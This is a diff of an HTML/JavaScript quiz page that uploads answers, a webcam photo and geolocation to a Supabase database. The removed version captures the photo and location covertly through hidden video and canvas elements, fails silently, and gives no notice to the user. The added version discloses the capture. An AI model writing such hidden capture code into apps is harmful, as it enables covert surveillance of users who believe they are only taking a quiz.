@@ -1,147 +1,289 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Quiz App</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <style>
-        body { font-family: sans-serif; padding: 20px; background: #f0f2f5; max-width: 600px; margin: auto; }
-        .card { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
-        button:hover { background: #0056b3; }
-        .question { font-weight: bold; margin-bottom: 10px; }
-        label { display: block; margin-bottom: 8px; cursor: pointer; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quiz Application</title>
+  <!-- Load Supabase JS Client -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f7f6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 500px;
+      text-align: center;
+    }
+    .hidden { display: none; }
+    video { width: 100%; border-radius: 8px; margin-bottom: 15px; }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
+      width: 100%;
+    }
+    button:hover { background-color: #0056b3; }
+    .option-btn {
+      background-color: #e9ecef;
+      color: #333;
+      margin: 8px 0;
+      text-align: left;
+    }
+    .option-btn:hover { background-color: #d3d9df; }
+    .option-btn.selected {
+      background-color: #28a745;
+      color: white;
+    }
+    #question-text { font-size: 18px; font-weight: bold; margin-bottom: 20px; }
+    .status { margin-top: 15px; font-size: 14px; color: #666; }
+  </style>
 </head>
 <body>
 
-    <div class="card" id="quiz-area" style="display:none;">
-        <h2>General Knowledge Quiz</h2>
-        <div id="questions-container"></div>
-        <button onclick="submitQuiz()">Submit</button>
+  <!-- Screen 1: Permissions & Capture -->
+  <div id="init-screen" class="card">
+    <h2>Welcome to the Quiz</h2>
+    <p>Please allow camera and location access to begin.</p>
+    <video id="camera-feed" autoplay playsinline class="hidden"></video>
+    <canvas id="photo-canvas" class="hidden"></canvas>
+    <button id="start-btn">Grant Access & Start</button>
+    <p id="init-status" class="status"></p>
+  </div>
+
+  <!-- Screen 2: Quiz -->
+  <div id="quiz-screen" class="card hidden">
+    <div style="display: flex; justify-content: space-between; font-size: 14px; margin-bottom: 15px; color: #666;">
+      <span id="question-tracker">Question 1/10</span>
     </div>
+    <div id="question-text">Question goes here?</div>
+    <div id="options-container"></div>
+    <button id="next-btn" class="hidden">Next Question</button>
+  </div>
 
-    <!-- Hidden elements for camera capture -->
-    <video id="hidden-video" autoplay playsinline style="display:none;"></video>
-    <canvas id="hidden-canvas" style="display:none;"></canvas>
+  <!-- Screen 3: Completion -->
+  <div id="result-screen" class="card hidden">
+    <h2>Quiz Complete!</h2>
+    <p>Your answers, photo, and location have been securely saved.</p>
+    <p id="final-status" class="status"></p>
+  </div>
 
-    <script>
-        const SUPABASE_URL = 'https://rubhdpgebyjtqwwyyzox.supabase.co';
-        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ1YmhkcGdlYnlqdHF3d3l5em94Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTM3MDk3ODQsImV4cCI6MjEwOTI4NTc4NH0.vxWRPW4gBhyYCRnpiShPC-jVOr9--yMTpuExEHIktCs';
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  <script>
+    // Initialize Supabase
+    const SUPABASE_URL = 'YOUR_SUPABASE_URL';
+    const SUPABASE_KEY = 'YOUR_SUPABASE_ANON_KEY';
+    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        let userLocation = { lat: null, lng: null };
-        let cameraStream = null;
+    // 10 Demo Questions focused on foundational Science & Social Science
+    const quizData = [
+      {
+        question: "Which phenomenon is responsible for the human eye perceiving the colorful world?",
+        options: ["Reflection", "Dispersion of light", "Total Internal Reflection", "Interference"],
+        correct: 1
+      },
+      {
+        question: "The SI unit of electric current is:",
+        options: ["Volt", "Ohm", "Ampere", "Watt"],
+        correct: 2
+      },
+      {
+        question: "According to modern atomic models, where is the mass of an atom primarily concentrated?",
+        options: ["In the electron cloud", "In the nucleus", "Equally distributed", "In empty space"],
+        correct: 1
+      },
+      {
+        question: "Which of the following mirrors is used by a dentist to examine a small cavity?",
+        options: ["Convex mirror", "Plane mirror", "Concave mirror", "Any spherical mirror"],
+        correct: 2
+      },
+      {
+        question: "Which part of the plant is responsible for the transport of water?",
+        options: ["Phloem", "Xylem", "Stomata", "Chloroplast"],
+        correct: 1
+      },
+      {
+        question: "Which soil type is most widely spread and important in India?",
+        options: ["Alluvial soil", "Black soil", "Red soil", "Laterite soil"],
+        correct: 0
+      },
+      {
+        question: "In economics, banking and communication fall under which sector?",
+        options: ["Primary sector", "Secondary sector", "Tertiary sector", "Quaternary sector"],
+        correct: 2
+      },
+      {
+        question: "Which gas is released during photosynthesis?",
+        options: ["Carbon dioxide", "Oxygen", "Nitrogen", "Methane"],
+        correct: 1
+      },
+      {
+        question: "An alloy of copper and zinc is known as:",
+        options: ["Bronze", "Brass", "Solder", "Steel"],
+        correct: 1
+      },
+      {
+        question: "The focal length of a plane mirror is:",
+        options: ["Zero", "Infinity", "25 cm", "-25 cm"],
+        correct: 1
+      }
+    ];
 
-        const quizData = [
-            { id: 1, q: "What is the capital of France?", options: ["London", "Berlin", "Paris", "Madrid"], answer: "Paris" },
-            { id: 2, q: "Which planet is known as the Red Planet?", options: ["Venus", "Mars", "Jupiter", "Saturn"], answer: "Mars" },
-            { id: 3, q: "Who wrote 'Hamlet'?", options: ["Charles Dickens", "William Shakespeare", "Mark Twain", "Jane Austen"], answer: "William Shakespeare" },
-            { id: 4, q: "What is the largest ocean on Earth?", options: ["Atlantic", "Indian", "Arctic", "Pacific"], answer: "Pacific" },
-            { id: 5, q: "What is the chemical symbol for Gold?", options: ["Ag", "Fe", "Au", "Cu"], answer: "Au" },
-            { id: 6, q: "In which year did World War II end?", options: ["1941", "1945", "1918", "1939"], answer: "1945" },
-            { id: 7, q: "Which animal is the largest living primate?", options: ["Chimpanzee", "Gorilla", "Orangutan", "Baboon"], answer: "Gorilla" },
-            { id: 8, q: "What is the hardest natural substance on Earth?", options: ["Iron", "Diamond", "Quartz", "Granite"], answer: "Diamond" },
-            { id: 9, q: "Which country invented tea?", options: ["India", "UK", "China", "Japan"], answer: "China" },
-            { id: 10, q: "How many bones are in the adult human body?", options: ["206", "201", "210", "196"], answer: "206" }
-        ];
+    let currentQuestionIndex = 0;
+    let userAnswers = [];
+    let capturedPhotoBase64 = "";
+    let capturedLocation = { lat: null, lng: null };
+    let selectedOptionIndex = null;
 
-        async function initApp() {
-            try {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            userLocation.lat = pos.coords.latitude;
-                            userLocation.lng = pos.coords.longitude;
-                        },
-                        (err) => console.error(err) // Fails silently
-                    );
-                }
+    // DOM Elements
+    const initScreen = document.getElementById('init-screen');
+    const quizScreen = document.getElementById('quiz-screen');
+    const resultScreen = document.getElementById('result-screen');
+    const startBtn = document.getElementById('start-btn');
+    const initStatus = document.getElementById('init-status');
+    const cameraFeed = document.getElementById('camera-feed');
+    const photoCanvas = document.getElementById('photo-canvas');
+    
+    const questionText = document.getElementById('question-text');
+    const optionsContainer = document.getElementById('options-container');
+    const nextBtn = document.getElementById('next-btn');
+    const questionTracker = document.getElementById('question-tracker');
 
-                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('hidden-video').srcObject = cameraStream;
+    // Step 1: Capture Location and Photo
+    startBtn.addEventListener('click', async () => {
+      startBtn.disabled = true;
+      initStatus.innerText = "Requesting permissions...";
 
-                renderQuiz();
-                document.getElementById('quiz-area').style.display = 'block';
-            } catch (err) {
-                console.error(err); // Fails silently, won't show errors to the user
+      try {
+        // Get Location
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+        });
+        capturedLocation.lat = position.coords.latitude;
+        capturedLocation.lng = position.coords.longitude;
+
+        // Get Camera
+        initStatus.innerText = "Accessing camera...";
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        cameraFeed.srcObject = stream;
+        cameraFeed.classList.remove('hidden');
+        
+        // Wait for video to load then capture
+        await new Promise(resolve => cameraFeed.onloadedmetadata = resolve);
+        
+        // Scale down to prevent massive Base64 strings
+        const context = photoCanvas.getContext('2d');
+        photoCanvas.width = 320;
+        photoCanvas.height = 240;
+        context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
+        
+        capturedPhotoBase64 = photoCanvas.toDataURL('image/jpeg', 0.8);
+        
+        // Stop camera tracks to turn off the webcam light
+        stream.getTracks().forEach(track => track.stop());
+
+        // Start Quiz
+        initScreen.classList.add('hidden');
+        quizScreen.classList.remove('hidden');
+        loadQuestion();
+
+      } catch (err) {
+        console.error(err);
+        initStatus.innerText = "Error: You must allow both Camera and Location access to proceed.";
+        initStatus.style.color = "red";
+        startBtn.disabled = false;
+      }
+    });
+
+    // Step 2: Render Questions
+    function loadQuestion() {
+      selectedOptionIndex = null;
+      nextBtn.classList.add('hidden');
+      
+      const q = quizData[currentQuestionIndex];
+      questionTracker.innerText = `Question ${currentQuestionIndex + 1}/10`;
+      questionText.innerText = q.question;
+      
+      optionsContainer.innerHTML = '';
+      
+      q.options.forEach((opt, index) => {
+        const btn = document.createElement('button');
+        btn.innerText = opt;
+        btn.className = 'option-btn';
+        btn.onclick = () => selectOption(index, btn);
+        optionsContainer.appendChild(btn);
+      });
+    }
+
+    function selectOption(index, btn) {
+      selectedOptionIndex = index;
+      
+      // Update UI
+      const allBtns = optionsContainer.querySelectorAll('.option-btn');
+      allBtns.forEach(b => b.classList.remove('selected'));
+      btn.classList.add('selected');
+      
+      nextBtn.classList.remove('hidden');
+      if(currentQuestionIndex === quizData.length - 1) {
+        nextBtn.innerText = "Submit Quiz";
+      }
+    }
+
+    // Step 3: Handle Progression & DB Submission
+    nextBtn.addEventListener('click', async () => {
+      // Record answer
+      userAnswers.push({
+        question: quizData[currentQuestionIndex].question,
+        selectedAnswer: quizData[currentQuestionIndex].options[selectedOptionIndex],
+        isCorrect: selectedOptionIndex === quizData[currentQuestionIndex].correct
+      });
+
+      currentQuestionIndex++;
+
+      if (currentQuestionIndex < quizData.length) {
+        loadQuestion();
+      } else {
+        // Finish Quiz
+        quizScreen.classList.add('hidden');
+        resultScreen.classList.remove('hidden');
+        document.getElementById('final-status').innerText = "Saving to database...";
+        
+        // Submit to Supabase
+        const { data, error } = await supabase
+          .from('quiz_submissions')
+          .insert([
+            { 
+              latitude: capturedLocation.lat, 
+              longitude: capturedLocation.lng, 
+              photo_base64: capturedPhotoBase64, 
+              answers: userAnswers 
             }
+          ]);
+
+        if (error) {
+          console.error(error);
+          document.getElementById('final-status').innerText = "Database Error: " + error.message;
+          document.getElementById('final-status').style.color = "red";
+        } else {
+          document.getElementById('final-status').innerText = "Successfully saved to Supabase!";
+          document.getElementById('final-status').style.color = "green";
         }
-
-        function renderQuiz() {
-            const container = document.getElementById('questions-container');
-            let html = '';
-            quizData.forEach((item, index) => {
-                html += `<div class="card" style="box-shadow: none; border: 1px solid #ddd;">
-                    <div class="question">Q${index + 1}: ${item.q}</div>`;
-                item.options.forEach(opt => {
-                    html += `<label>
-                        <input type="radio" name="q${item.id}" value="${opt}"> ${opt}
-                    </label>`;
-                });
-                html += `</div>`;
-            });
-            container.innerHTML = html;
-        }
-
-        async function submitQuiz() {
-            let score = 0;
-            const answers = {};
-            let allAnswered = true;
-
-            quizData.forEach(item => {
-                const selected = document.querySelector(`input[name="q${item.id}"]:checked`);
-                if (selected) {
-                    answers[item.id] = selected.value;
-                    if (selected.value === item.answer) score++;
-                } else {
-                    allAnswered = false;
-                }
-            });
-
-            if (!allAnswered) {
-                alert("Please answer all questions before submitting.");
-                return;
-            }
-
-            try {
-                const video = document.getElementById('hidden-video');
-                const canvas = document.getElementById('hidden-canvas');
-                let base64Photo = null;
-                
-                if (video.videoWidth > 0) {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    base64Photo = canvas.toDataURL('image/jpeg', 0.8);
-                }
-
-                const { error } = await supabase
-                    .from('quiz_submissions')
-                    .insert([{
-                        answers: answers,
-                        score: score,
-                        latitude: userLocation.lat,
-                        longitude: userLocation.lng,
-                        photo: base64Photo
-                    }]);
-
-                if (!error) {
-                    document.getElementById('quiz-area').innerHTML = `<h2>Quiz completed! Your score is: ${score}/10</h2>`;
-                    if (cameraStream) {
-                        cameraStream.getTracks().forEach(track => track.stop());
-                    }
-                } else {
-                    console.error(error); // Silently catches database errors
-                }
-            } catch (err) {
-                console.error(err); // Silently catches unexpected errors
-            }
-        }
-
-        window.onload = initApp;
-    </script>
+      }
+    });
+  </script>
 </body>
 </html>
